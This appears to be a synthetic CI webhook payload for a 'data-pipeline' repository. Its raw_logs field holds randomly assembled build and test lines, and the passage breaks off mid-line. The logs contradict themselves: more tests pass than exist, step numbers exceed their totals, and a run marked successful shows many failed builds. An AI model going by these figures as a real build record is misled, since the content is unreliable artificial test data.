{
  "action": "completed",
  "workflow_run": {
    "id": 476,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "757a2f01c0a6c50d25c2a0a651c1d0b710539bec",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-10T12:46:53.046620Z",
    "updated_at": "2025-12-10T12:49:38.572457Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: e2e_tests ===\nArtifact uploaded: dist.zip (43MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/utils.go...\nDone.\n[12:46:53] INFO: Starting build process\nException: NullPointerException\nPulling image: python:3.11\n[12:46:53] WARN: Deprecated API usage\nChecking out master branch\n\u2713 test completed\nCache miss for key-8039\nTests: 230 passed, 243 total\nSwitched to branch 'feature/task-279'\nCompiling src/service.java...\nStep 20/25: Testing\n[12:46:53] WARN: Deprecated API usage\n[12:46:53] WARN: Deprecated API usage\npip install: Successfully installed lodash-5.11\nSuccess!\nAlready up to date.\nnpm install: resolved 1059 packages\nChecking out develop branch\n\u2713 Task completed in 1560ms\nSuccess!\nFetching submodules...\nSwitched to branch 'bugfix/task-563'\n\u2713 Task completed in 2019ms\nCache hit for key-4350\nArtifact uploaded: dist.zip (62MB)\nVerifying...\nNODE_ENV=development\nCompiling utils/service.java...\nOptimizing 41 modules...\nPushing to registry...\nEnvironment: development\nCache restored successfully (371MB)\nNODE_ENV=development\nPushing to registry...\nStep 1/20: Running migrations\nCache invalidated: node_modules\n[12:46:53] WARN: Deprecated API usage\nUsing Python 3.11\npip: Downloading lodash-5.3.tar.gz\n[12:46:53] INFO: Cache refreshed\nInstalling axios@2.6.1\npip: Downloading prettier-1.1.tar.gz\nSuccess!\nStep 20/20: Linting\nUploading artifact 'dist' (31 files)\nFetching submodules...\nEnvironment: test\nSnapshots: 27 passed, 37 total\n[12:46:53] DEBUG: Loading configuration\n[12:46:53] WARN: Deprecated API usage\n[12:46:53] INFO: Request completed\nyarn add: Done in 26.60s\nSwitched to branch 'hotfix/task-178'\nSnapshots: 14 passed, 44 total\n[12:46:53] WARN: Deprecated API usage\nUsing Node.js 16.5.8\nSuccess!\nDone.\nStep 18/15: Testing\nLayer 7/11: ENV command\nCompiling utils/utils.go...\n  PASS: test_api_health (6ms)\nEnvironment: staging\nUsing Node.js 18.18.9\n  PASS: integration/test_cache_hit.spec.js\nCache hit for key-6150\nEnvironment: staging\nStep 1/18: Running migrations\nTests: 159 passed, 241 total\nWARNING: eslint has known vulnerabilities\n[12:46:53] DEBUG: Memory usage: 1731MB\nChecking out main branch\nStep 5/22: Linting\nEnvironment: staging\nChecking out main branch\n\u2713 All checks passed\n[12:46:53] INFO: Processing request\nCoverage: 94% statements, 71% branches\nyarn add: Done in 19.6s\npip: Collecting eslint\nTLS handshake completed\nCache saved successfully\nHEAD is now at fa4e37a\n  PASS: e2e/test_db_connect.spec.js\n[12:46:53] DEBUG: Memory usage: 1101MB\nWaiting...\nStep 15/25: Installing dependencies\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\nCompiling components/main.py...\npip: Collecting express\nPushing to registry...\nBundling styles.css\nArtifact uploaded: build.tar.gz (45MB)\nWARNING: express has known vulnerabilities\nWARNING: react has known vulnerabilities\nProcessing...\n\u2713 package completed\nTime: 4.266s\nStep 16/24: Deploying\n  PASS: test_user_create (128ms)\nRan 63 tests in 24s\nProcessing...\nCoverage: 95% statements, 89% branches\nLoading...\nFetching from https://googleapis.com/package.json\nCache restored successfully (106MB)\npip install: Successfully installed express-3.14\nProcessing...\n\u2717 build failed with exit code 73\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTransforming 326 files...\nInstalling lodash@5.5.8\nBuilding Docker image...\nSnapshots: 12 passed, 36 total\nnpm notice: package.json updated\n[12:46:53] DEBUG: Initializing service\nCoverage: 83% statements, 86% branches\nBuilding Docker image...\nTests: 247 passed, 101 total\nHEAD is now at bd66fae\nStep 17/22: Running migrations\nStep 2/20: Testing\nCache saved successfully\nStep 4/25: Testing\nRan 130 tests in 33s\nFetching submodules...\nUsing Node.js 18.15.3\nGenerating source maps...\nCompiling utils/app.ts...\nChecking out main branch\n[12:46:53] WARN: Deprecated API usage\nTLS handshake completed\npip: Collecting eslint\nGET /api - 204 (7ms)\nStep 4/17: Testing\npip: Installing build dependencies...\nCache miss for key-4377\nArtifact uploaded: dist.zip (33MB)\nTransforming 245 files...\nLoading...\nBuilding Docker image...\n  PASS: unit/test_auth_login.spec.js\nArtifact downloaded: 28MB\npip install: Successfully installed lodash-3.16\nOptimizing 65 modules...\nCache restored successfully (246MB)\nCache miss for key-9658\nUploading artifact 'coverage' (16 files)\nFetching submodules...\nCompleted.\n\u2713 All checks passed\nSnapshots: 17 passed, 18 total\nFAILED: test_cache_hit\nCompiling components/handler.rs...\npip install: Successfully installed jest-5.19\nAlready up to date.\nLoading...\nnpm install: resolved 114 packages\nMinifying vendor.js\nCompiling utils/main.py...\nTLS handshake completed\n[12:46:53] INFO: Request completed\nEnvironment: development\nGenerating source maps...\n  PASS: e2e/test_db_connect.spec.js\n[12:46:53] DEBUG: Initializing service\nTests: 195 passed, 176 total\n[12:46:53] DEBUG: Query executed in 18ms\nSuccess!\nBundling styles.js\nConnection established\nSnapshots: 35 passed, 43 total\npip: Downloading express-3.3.tar.gz\nnpm install: resolved 1952 packages\nStep 8/15: Deploying\nnpm install: resolved 1816 packages\n  PASS: test_user_create (441ms)\n[12:46:53] INFO: Request completed\n[12:46:53] INFO: Processing request\n[12:46:53] INFO: Cache refreshed\nArtifact uploaded: dist.zip (51MB)\nGET /status - 200 (58ms)\nPushing to registry...\n[12:46:53] DEBUG: Memory usage: 1265MB\n[12:46:53] DEBUG: Connection pool: 19 active\n[12:46:53] WARN: Deprecated API usage\nnpm notice: created a lockfile\nCache saved successfully\nCache miss for key-2336\nCreating production build...\nLayer 8/10: RUN command\n[12:46:53] INFO: Cache refreshed\nCompiling components/handler.rs...\nStep 11/16: Linting\nCompiling lib/index.js...\nChecking out develop branch\n=== Step e2e_tests completed ===\n=== Step: upload_artifacts ===\nChecking out develop branch\nPushing to registry...\nImage pulled successfully\nyarn add: Done in 13.85s\n[12:46:53] DEBUG: Loading configuration\nOK\nCompleted.\n[12:46:53] DEBUG: Query executed in 24ms\nSuccess!\n[12:46:53] INFO: Processing request\nTime: 117.33s\nVerifying...\npip: Downloading lodash-3.14.tar.gz\npip: Installing build dependencies...\n[12:46:53] DEBUG: Query executed in 61ms\n\u2713 Step 'install' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Installing build dependencies...\nArtifact downloaded: 31MB\nUploading artifact 'coverage' (27 files)\n[12:46:53] INFO: Connecting to database\nRan 109 tests in 19s\nWARNING: react has known vulnerabilities\nStep 14/15: Linting\nRan 159 tests in 29s\nStep 19/23: Installing dependencies\nMinifying app.js\nnpm notice: package.json updated\nUploading artifact 'dist' (12 files)\nPlatform: win32-x64\n[12:46:53] INFO: Connecting to database\nCompiling utils/handler.rs...\nReady.\nFetching from https://docker.io/package.json\nPlatform: darwin-arm64\n\u2713 All checks passed\n[12:46:53] WARN: Deprecated API usage\nCoverage: 100% statements, 71% branches\nPushing to registry...\nGenerating source maps...\nBundling main.css\n\u2713 Task completed in 201ms\nPOST /upload - 200 (245ms)\nBuilding Docker image...\n\u2713 lint completed\nStep 3/24: Running migrations\n[12:46:53] DEBUG: Connection pool: 13 active\nArtifact downloaded: 15MB\nHEAD is now at 4577774\n[12:46:53] INFO: Cache refreshed\nSuccess!\n\u2713 All checks passed\nNODE_ENV=development\nLayer 6/8: RUN command\nImage pulled successfully\n[12:46:53] DEBUG: Memory usage: 329MB\nBuilding Docker image...\n\u2713 All checks passed\nUsing Python 3.12\nCache invalidated: build\nSwitched to branch 'hotfix/task-383'\nTests: 420 passed, 442 total\nAlready up to date.\nCache invalidated: dependencies\nTransforming 347 files...\nDone.\n[12:46:53] DEBUG: Connection pool: 17 active\nLoading...\nTime: 74.503s\nNODE_ENV=production\nMinifying main.js\nOptimizing 35 modules...\nCache restored successfully (494MB)\n[12:46:53] WARN: Deprecated API usage\nPOST /api - 201 (397ms)\nLoading...\nFinished.\nLayer 8/9: COPY command\nProcessing...\n\u2717 build failed with exit code 5\nSuccess!\n[12:46:53] INFO: Cache refreshed\nCompiling src/service.java...\nFAILED: test_auth_login\npip: Installing build dependencies...\n\u2713 package completed\nBundling runtime.css\nLayer 4/11: COPY command\nnpm install: resolved 1657 packages\nCoverage: 86% statements, 76% branches\nFetching submodules...\nyarn add: Done in 5.93s\nStep 11/17: Testing\nStep 10/18: Linting\nCreating production build...\nCache restored successfully (490MB)\nTransforming 676 files...\nWaiting...\nWARNING: prettier has known vulnerabilities\nRan 166 tests in 14s\nBundling main.css\n[12:46:53] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nCompiling utils/app.ts...\nConnection established\nProcessing...\nCompiling utils/index.js...\n[12:46:53] DEBUG: Memory usage: 180MB\n\u2713 validate completed\n\u2713 Task completed in 2684ms\nStep 2/23: Testing\nCompiling utils/service.java...\nStep 7/16: Building\nDone.\nUploading artifact 'dist' (7 files)\nOK\nRan 198 tests in 16s\npip: Installing build dependencies...\nArtifact downloaded: 17MB\npip: Collecting express\nUploading artifact 'build' (25 files)\nFinished.\n[12:46:53] WARN: Deprecated API usage\n[12:46:53] DEBUG: Memory usage: 1061MB\npip: Collecting eslint\nInstalling lodash@3.7.4\nEnvironment: staging\nCompiling lib/index.js...\n[12:46:53] DEBUG: Query executed in 84ms\n[12:46:53] WARN: Deprecated API usage\n\u2717 build failed with exit code 74\nCompiling utils/utils.go...\nPushing to registry...\nGenerating source maps...\nCompleted.\nPulling image: python:18\nnpm notice: package.json updated\nCompleted.\nGenerating source maps...\nException: TypeError\nTransforming 724 files...\nCache saved successfully\nBundling runtime.js\nCache miss for key-5092\nFAILED: test_auth_login\nRan 169 tests in 6s\nEnvironment: production\nInstalling jest@4.18.8\n[12:46:53] ERROR: Connection failed\nException: NullPointerException\nCache restored successfully (214MB)\nCompiling components/utils.go...\nCompiling components/app.ts...\nStep 10/19: Installing dependencies\nCreating production build...\nnpm notice: created a lockfile\nTest Suites: 5 passed, 21 total\nEnvironment: test\nReady.\n[12:46:53] INFO: Request completed\npip: Downloading lodash-5.17.tar.gz\npip install: Successfully installed jest-4.18\nRan 138 tests in 4s\n  PASS: e2e/test_user_create.spec.js\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nFinished.\n  PASS: test_cache_hit (438ms)\nArtifact uploaded: build.tar.gz (50MB)\nCreating production build...\n[12:46:53] INFO: Processing request\n\u2717 build failed with exit code 70\nFinished.\nUploading artifact 'build' (14 files)\nUsing Python 3.11\nPushing to registry...\nEnvironment: staging\nCache restored successfully (400MB)\nCompiling utils/service.java...\nnpm notice: package.json updated\nRan 191 tests in 34s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPlatform: linux-x64\nCache restored successfully (372MB)\nImage pulled successfully\nBuilding Docker image...\nTests: 311 passed, 375 total\n\u2713 Task completed in 2208ms\nnpm notice: package.json updated\nWaiting...\nGET /api - 201 (80ms)\nMinifying app.js\nPOST /data - 202 (279ms)\n[12:46:53] INFO: Cache refreshed\nArtifact uploaded: dist.zip (16MB)\nStep 2/24: Linting\nnpm install: added 13 packages\npip: Collecting lodash\nTLS handshake completed\nArtifact downloaded: 48MB\nTransforming 373 files...\nCompiling utils/app.ts...\n=== Step upload_artifacts completed ===\n=== Step: setup_environment ===\nArtifact uploaded: dist.zip (81MB)\nVerifying...\nArtifact uploaded: dist.zip (81MB)\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out master branch\npip: Collecting axios\nTransforming 113 files...\nAlready up to date.\nImage pulled successfully\nnpm notice: created a lockfile\n[12:46:53] INFO: Processing request\nnpm install: resolved 639 packages\nPulling image: python:latest\nUsing Node.js 15.1.0\nBundling runtime.js\nPushing to registry...\nUsing Python 3.12\nVerifying...\nUploading artifact 'build' (15 files)\n  PASS: e2e/test_api_health.spec.js\n  PASS: unit/test_cache_hit.spec.js\nCache saved successfully\nGET /api - 201 (42ms)\nStep 19/15: Running migrations\nyarn add: Done in 3.92s\nCache invalidated: dependencies\nTests: 325 passed, 431 total\nCache restored successfully (408MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 5/20: Running migrations\nTest Suites: 18 passed, 5 total\npip: Collecting jest\nStep 20/25: Building\nArtifact uploaded: build.tar.gz (5MB)\nnpm install: resolved 352 packages\nTest Suites: 38 passed, 32 total\nGenerating source maps...\nSuccess!\npip: Downloading jest-4.19.tar.gz\nStep 1/21: Building\nArtifact uploaded: dist.zip (66MB)\nSwitched to branch 'hotfix/task-484'\nPOST /data - 202 (389ms)\n[12:46:53] DEBUG: Memory usage: 716MB\nDone.\nImage pulled successfully\nCompleted.\nWARNING: axios has known vulnerabilities\nStep 14/24: Testing\nChecking out master branch\npip: Collecting react\n  PASS: e2e/test_auth_login.spec.js\nVerifying...\nHEAD is now at 737d87b\nUsing Node.js 14.15.9\n\u2713 Step 'install' succeeded\nUploading artifact 'dist' (46 files)\nStep 12/24: Deploying\nFetching submodules...\nNODE_ENV=test\nTime: 65.306s\nCompiling utils/handler.rs...\n\u2717 build failed with exit code 34\nCompleted.\nRan 113 tests in 21s\nnpm install: added 220 packages\nStep 16/18: Linting\npip: Downloading express-1.7.tar.gz\nStep 9/19: Testing\n\u2713 Task completed in 4563ms\nUploading artifact 'coverage' (20 files)\n  PASS: test_auth_login (62ms)\nRan 35 tests in 6s\nPulling image: python:3.11\nCache restored successfully (51MB)\n  PASS: test_auth_login (333ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTransforming 489 files...\nUploading artifact 'dist' (30 files)\nFinished.\nUploading artifact 'build' (40 files)\nCache restored successfully (64MB)\n[12:46:53] ERROR: Connection failed\nUploading artifact 'dist' (10 files)\nException: NullPointerException\n\u2713 validate completed\nBundling main.js\nnpm install: resolved 125 packages\nProcessing...\nPlatform: win32-x64\nCache saved successfully\npip install: Successfully installed express-5.4\nAlready up to date.\nStep 8/23: Installing dependencies\nPulling image: node:latest\nCache miss for key-1043\n[12:46:53] DEBUG: Query executed in 53ms\nAlready up to date.\nStep 9/20: Linting\nRan 124 tests in 7s\nUsing Node.js 17.17.1\nCoverage: 74% statements, 74% branches\nWARNING: jest has known vulnerabilities\nConnection established\nCache invalidated: dependencies\n[12:46:53] DEBUG: Query executed in 8ms\nConnection established\nGenerating source maps...\nHEAD is now at dfff276\npip install: Successfully installed axios-4.16\nTransforming 521 files...\nConnection established\nReady.\nPlatform: linux-x64\n\u2713 test completed\nProcessing...\n\u2713 Task completed in 877ms\nCoverage: 74% statements, 73% branches\nLayer 4/9: COPY command\npip: Collecting prettier\npip: Downloading express-1.18.tar.gz\nCompleted.\nArtifact uploaded: dist.zip (12MB)\n\u2713 validate completed\nStep 6/19: Building\n\u2713 Step 'setup' succeeded\nBuilding Docker image...\nArtifact downloaded: 43MB\nyarn add: Done in 30.29s\nStep 10/16: Running migrations\n[12:46:53] INFO: Connecting to database\nPulling image: node:18\n[12:46:53] WARN: Deprecated API usage\nFAILED: test_api_health\npip: Downloading jest-1.19.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache miss for key-3155\npip: Installing build dependencies...\nTime: 56.535s\npip: Downloading react-3.9.tar.gz\nCache restored successfully (409MB)\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (327MB)\nCompiling lib/utils.go...\nVerifying...\n[12:46:53] INFO: Processing request\n[12:46:53] DEBUG: Connection pool: 19 active\n[12:46:53] DEBUG: Memory usage: 1910MB\nGET /status - 204 (51ms)\nTime: 88.237s\nHEAD is now at 483d07e\nConnection established\nUsing Node.js 15.9.2\n\u2713 Task completed in 4873ms\nUsing Node.js 18.11.7\nTransforming 632 files...\nyarn add: Done in 5.66s\nUsing Python 3.11\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCreating production build...\nArtifact downloaded: 8MB\nArtifact uploaded: build.tar.gz (39MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:53] INFO: Connecting to database\nCreating production build...\nArtifact uploaded: build.tar.gz (50MB)\n[12:46:53] INFO: Connecting to database\nSnapshots: 45 passed, 2 total\n[12:46:53] INFO: Cache refreshed\nCache saved successfully\nAlready up to date.\nStep 10/18: Building\nFAILED: test_db_connect\npip install: Successfully installed lodash-4.16\nLoading...\nNODE_ENV=production\nCreating production build...\nTests: 154 passed, 290 total\n[12:46:53] DEBUG: Connection pool: 1 active\nCoverage: 82% statements, 92% branches\nStep 11/24: Building\nGET /api - 201 (5ms)\nImage pulled successfully\nPulling image: alpine:3.11\n\u2717 build failed with exit code 6\nGenerating source maps...\n[12:46:53] WARN: Deprecated API usage\n[12:46:53] DEBUG: Query executed in 95ms\n[12:46:53] DEBUG: Loading configuration\nPlatform: linux-x64\nNODE_ENV=development\nFetching submodules...\nCache hit for key-3594\nCoverage: 77% statements, 86% branches\nPulling image: python:3.11\npip: Collecting react\nSwitched to branch 'bugfix/task-920'\nnpm notice: created a lockfile\nCache hit for key-6985\nAlready up to date.\n=== Step setup_environment completed ===\n=== Step: save_cache ===\n[12:46:53] INFO: Connecting to database\nLayer 1/9: ENV command\nCache saved successfully\nCompiling lib/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nyarn add: Done in 23.87s\nFAILED: test_db_connect\nPOST /upload - 200 (386ms)\nnpm install: resolved 1640 packages\nCache saved successfully\nArtifact downloaded: 45MB\n[12:46:53] DEBUG: Loading configuration\nTests: 430 passed, 86 total\nProcessing...\nException: TypeError\nUploading artifact 'coverage' (47 files)\nVerifying...\nFinished.\nRan 151 tests in 32s\nBuilding Docker image...\nStep 12/24: Installing dependencies\nEnvironment: test\nOptimizing 72 modules...\nPOST /upload - 200 (389ms)\nChecking out master branch\nMinifying app.js\n[12:46:53] INFO: Processing request\nWARNING: axios has known vulnerabilities\nWaiting...\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: unit/test_cache_hit.spec.js\nStep 20/16: Building\nRan 193 tests in 53s\nException: ValueError\nAlready up to date.\n[12:46:53] INFO: Connecting to database\nNODE_ENV=production\n\u2713 Task completed in 836ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\npip: Collecting jest\n[12:46:53] INFO: Processing request\nStep 20/19: Building\nOptimizing 18 modules...\n[12:46:53] WARN: Deprecated API usage\nCache restored successfully (182MB)\nReady.\nCache miss for key-4713\nDone.\nFetching submodules...\nFinished.\nReady.\nTLS handshake completed\nCache restored successfully (186MB)\n\u2713 All checks passed\nCompiling lib/index.js...\npip install: Successfully installed lodash-5.15\nCache hit for key-8684\npip: Downloading jest-3.13.tar.gz\nSuccess!\nTransforming 510 files...\nStep 3/18: Running migrations\nUsing Python 3.11\nCache hit for key-5016\nOK\nFetching from https://npmjs.org/package.json\n  PASS: test_cache_hit (355ms)\nnpm install: added 268 packages\nGenerating source maps...\nReady.\nStep 2/25: Testing\nArtifact uploaded: build.tar.gz (42MB)\n[12:46:53] INFO: Cache refreshed\nCache restored successfully (31MB)\nStep 4/21: Building\n[12:46:53] DEBUG: Query executed in 93ms\nCache saved successfully\n  PASS: integration/test_user_create.spec.js\nnpm notice: created a lockfile\nGenerating source maps...\nCache restored successfully (292MB)\n[12:46:53] WARN: Deprecated API usage\nCompiling components/service.java...\nVerifying...\nyarn add: Done in 18.81s\nBuilding Docker image...\nRan 120 tests in 32s\nDone.\n[12:46:53] ERROR: Connection failed\nCache invalidated: dependencies\nOK\nCompiling utils/utils.go...\n\u2713 test completed\n[12:46:53] DEBUG: Memory usage: 998MB\nOptimizing 71 modules...\n[12:46:53] WARN: Deprecated API usage\nLoading...\nTests: 151 passed, 468 total\n[12:46:53] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 1982ms\nFAILED: test_cache_hit\n[12:46:53] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (17MB)\nCache restored successfully (408MB)\n[12:46:53] DEBUG: Loading configuration\nyarn add: Done in 6.99s\nVerifying...\n[12:46:53] WARN: Deprecated API usage\nnpm notice: package.json updated\nCache restored successfully (232MB)\n\u2717 build failed with exit code 91\nCompiling src/service.java...\nDone.\nVerifying...\nGET /status - 204 (99ms)\nCache saved successfully\nStep 5/18: Deploying\nOptimizing 47 modules...\nnpm install: added 394 packages\nCoverage: 89% statements, 96% branches\nLayer 6/12: COPY command\nnpm install: resolved 741 packages\n[12:46:53] ERROR: Connection failed\nCache miss for key-4564\nMinifying app.js\nyarn add: Done in 6.26s\nArtifact downloaded: 5MB\nSuccess!\nWaiting...\nCompleted.\nCompiling src/index.js...\nSnapshots: 12 passed, 31 total\nSnapshots: 19 passed, 43 total\n[12:46:53] INFO: Starting build process\nCompiling utils/index.js...\nCreating production build...\nMinifying main.js\nEnvironment: test\n\u2717 build failed with exit code 29\nStep 12/15: Installing dependencies\n\u2713 All checks passed\n  PASS: test_db_connect (342ms)\nCompleted.\nCache invalidated: build\nnpm install: resolved 1945 packages\n  PASS: test_api_health (87ms)\nnpm notice: created a lockfile\nCompiling utils/utils.go...\nArtifact uploaded: build.tar.gz (19MB)\nPulling image: node:3.11\nCompiling utils/app.ts...\n[12:46:53] INFO: Processing request\nProcessing...\nnpm notice: package.json updated\n\u2717 build failed with exit code 54\n[12:46:53] INFO: Connecting to database\nRan 131 tests in 54s\nStep 13/18: Building\nSnapshots: 9 passed, 16 total\n[12:46:53] DEBUG: Connection pool: 20 active\nArtifact uploaded: build.tar.gz (2MB)\nnpm notice: package.json updated\n\u2717 build failed with exit code 82\n\u2713 All checks passed\nStep 14/19: Running migrations\nPulling image: python:latest\nUsing Python 3.9\n[12:46:53] INFO: Request completed\nCache hit for key-5289\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTest Suites: 26 passed, 43 total\nArtifact uploaded: build.tar.gz (1MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: created a lockfile\nFAILED: test_db_connect\nPulling image: python:18\nSnapshots: 25 passed, 6 total\nStep 15/17: Testing\nHEAD is now at 359595e\nTests: 344 passed, 289 total\n[12:46:53] WARN: Deprecated API usage\nSwitched to branch 'feature/task-450'\n[12:46:53] INFO: Processing request\nFetching from https://amazonaws.com/package.json\nInstalling lodash@4.16.9\nBuilding Docker image...\nPushing to registry...\nConnection established\n\u2713 Task completed in 3890ms\n[12:46:53] DEBUG: Memory usage: 854MB\n\u2713 Step 'checkout' succeeded\nVerifying...\nBundling runtime.js\n[12:46:53] DEBUG: Initializing service\npip: Installing build dependencies...\nWaiting...\nException: ValueError\nStep 15/23: Installing dependencies\nStep 1/17: Testing\nLayer 8/10: RUN command\n[12:46:53] INFO: Starting build process\n=== Step save_cache completed ===\n=== Step: checkout ===\nProcessing...\n[12:46:53] ERROR: Connection failed\nPulling image: node:18\nCompiling utils/utils.go...\nUsing Python 3.9\npip: Installing build dependencies...\nSnapshots: 39 passed, 16 total\n[12:46:53] DEBUG: Loading configuration\n[12:46:53] ERROR: Connection failed\nLoading...\nCompiling components/utils.go...\nNODE_ENV=test\nCompiling components/app.ts...\nStep 7/21: Deploying\npip: Downloading eslint-3.10.tar.gz\n[12:46:53] DEBUG: Query executed in 47ms\n\u2713 All checks passed\nBuilding Docker image...\nMinifying main.js\npip install: Successfully installed react-2.13\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOptimizing 92 modules...\npip: Collecting react\nPOST /data - 200 (119ms)\n[12:46:53] INFO: Processing request\nRan 101 tests in 45s\nMinifying main.js\nPushing to registry...\npip: Downloading jest-5.4.tar.gz\nFetching submodules...\n[12:46:53] INFO: Starting build process\nBuilding Docker image...\nUsing Python 3.9\nWaiting...\nReady.\nOptimizing 16 modules...\nnpm install: resolved 1992 packages\nStep 13/25: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: express has known vulnerabilities\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (17MB)\nCompiling lib/handler.rs...\n[12:46:53] DEBUG: Query executed in 51ms\nPOST /api - 200 (457ms)\nyarn add: Done in 5.25s\nChecking out main branch\nUsing Node.js 19.18.7\nCache restored successfully (336MB)\nCreating production build...\nStep 18/19: Testing\n[12:46:53] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nCache invalidated: node_modules\n  PASS: e2e/test_api_health.spec.js\nStep 4/18: Building\nConnection established\nUsing Node.js 16.11.9\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCoverage: 92% statements, 79% branches\nSuccess!\nArtifact uploaded: dist.zip (10MB)\nReady.\n[12:46:53] INFO: Processing request\npip: Collecting jest\nTime: 116.742s\nnpm notice: created a lockfile\n\u2713 All checks passed\nVerifying...\nGET /status - 200 (11ms)\nFetching submodules...\nnpm install: added 413 packages\n[12:46:53] INFO: Starting build process\nCache saved successfully\nImage pulled successfully\nPlatform: darwin-arm64\nPOST /upload - 200 (304ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:53] INFO: Starting build process\n[12:46:53] DEBUG: Memory usage: 1478MB\n\u2713 Step 'setup' succeeded\n[12:46:53] INFO: Request completed\nCreating production build...\nPulling image: node:latest\nProcessing...\nCreating production build...\n[12:46:53] DEBUG: Loading configuration\n[12:46:53] INFO: Processing request\nFAILED: test_api_health\nPushing to registry...\n[12:46:53] INFO: Processing request\nCache miss for key-6960\nnpm install: resolved 1622 packages\n\u2717 build failed with exit code 70\nSnapshots: 49 passed, 1 total\n[12:46:53] DEBUG: Memory usage: 492MB\nWARNING: jest has known vulnerabilities\nUploading artifact 'build' (23 files)\nProcessing...\nCompiling components/utils.go...\nStep 12/16: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Task completed in 2467ms\nTest Suites: 32 passed, 15 total\n[12:46:53] INFO: Cache refreshed\n[12:46:53] WARN: Deprecated API usage\nInstalling jest@4.20.3\n[12:46:53] INFO: Starting build process\n[12:46:53] DEBUG: Query executed in 62ms\nImage pulled successfully\nMinifying main.js\nException: ValueError\nNODE_ENV=development\nTests: 308 passed, 290 total\nWARNING: webpack has known vulnerabilities\nCache hit for key-3525\nPOST /api - 202 (283ms)\n  PASS: integration/test_cache_hit.spec.js\nCache restored successfully (97MB)\n\u2713 validate completed\nLoading...\nStep 5/23: Building\nHEAD is now at f89b568\nyarn add: Done in 17.23s\n[12:46:53] DEBUG: Connection pool: 16 active\npip: Collecting express\nFetching from https://googleapis.com/package.json\nUsing Node.js 19.0.2\nConnection established\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 test completed\nException: ValueError\nGET /status - 200 (82ms)\npip: Downloading eslint-2.9.tar.gz\nCreating production build...\nImage pulled successfully\nTests: 222 passed, 71 total\n  PASS: test_db_connect (437ms)\nSnapshots: 19 passed, 25 total\nChecking out main branch\nDone.\nException: ValueError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling components/handler.rs...\nInstalling express@1.8.6\nStep 6/25: Linting\nArtifact uploaded: build.tar.gz (39MB)\nTime: 47.664s\n\u2713 Step 'install' succeeded\nWARNING: webpack has known vulnerabilities\nTransforming 993 files...\nFetching from https://docker.io/package.json\n[12:46:53] DEBUG: Initializing service\nTLS handshake completed\nAlready up to date.\nCache miss for key-4451\nBuilding Docker image...\nSwitched to branch 'feature/task-618'\npip: Downloading webpack-4.20.tar.gz\nnpm notice: package.json updated\n[12:46:53] DEBUG: Initializing service\n[12:46:53] INFO: Starting build process\nnpm install: added 472 packages\nTests: 324 passed, 162 total\nnpm notice: package.json updated\nnpm notice: created a lockfile\nStep 1/22: Installing dependencies\nTime: 29.241s\nArtifact uploaded: dist.zip (47MB)\nUsing Node.js 20.0.0\nMinifying app.js\nCache hit for key-1570\nBundling vendor.js\nCompiling utils/service.java...\nStep 12/17: Installing dependencies\nOK\npip install: Successfully installed lodash-5.15\n[12:46:53] DEBUG: Memory usage: 906MB\nEnvironment: staging\nConnection established\nLoading...\nEnvironment: staging\nCreating production build...\nOK\nStep 16/20: Linting\nArtifact downloaded: 33MB\nCompiling src/app.ts...\n\u2717 build failed with exit code 61\n[12:46:53] DEBUG: Query executed in 100ms\nDone.\n\u2713 Step 'install' succeeded\n[12:46:53] INFO: Request completed\nFetching submodules...\nUsing Python 3.10\nAlready up to date.\nPushing to registry...\nFetching submodules...\nStep 3/16: Installing dependencies\nPlatform: darwin-arm64\nFinished.\nBundling runtime.js\n=== Step checkout completed ===\n=== Step: deploy_production ===\n[12:46:53] DEBUG: Query executed in 41ms\nPushing to registry...\nTLS handshake completed\n  PASS: test_auth_login (61ms)\npip: Installing build dependencies...\nStep 8/23: Installing dependencies\nConnection established\nPOST /upload - 201 (494ms)\nBundling runtime.js\npip: Downloading lodash-1.10.tar.gz\nUploading artifact 'coverage' (7 files)\nFetching from https://gcr.io/package.json\n[12:46:53] ERROR: Connection failed\nDone.\nArtifact uploaded: build.tar.gz (50MB)\nGET /api - 200 (54ms)\npip install: Successfully installed jest-1.1\n[12:46:53] DEBUG: Initializing service\nFAILED: test_api_health\n\u2713 package completed\nEnvironment: test\n\u2713 Task completed in 4801ms\nDone.\n\u2713 build completed\nLayer 2/14: RUN command\n[12:46:53] DEBUG: Query executed in 21ms\nFetching submodules...\n\u2713 All checks passed\nyarn add: Done in 17.29s\n  PASS: test_api_health (49ms)\nCompiling lib/app.ts...\n[12:46:53] WARN: Deprecated 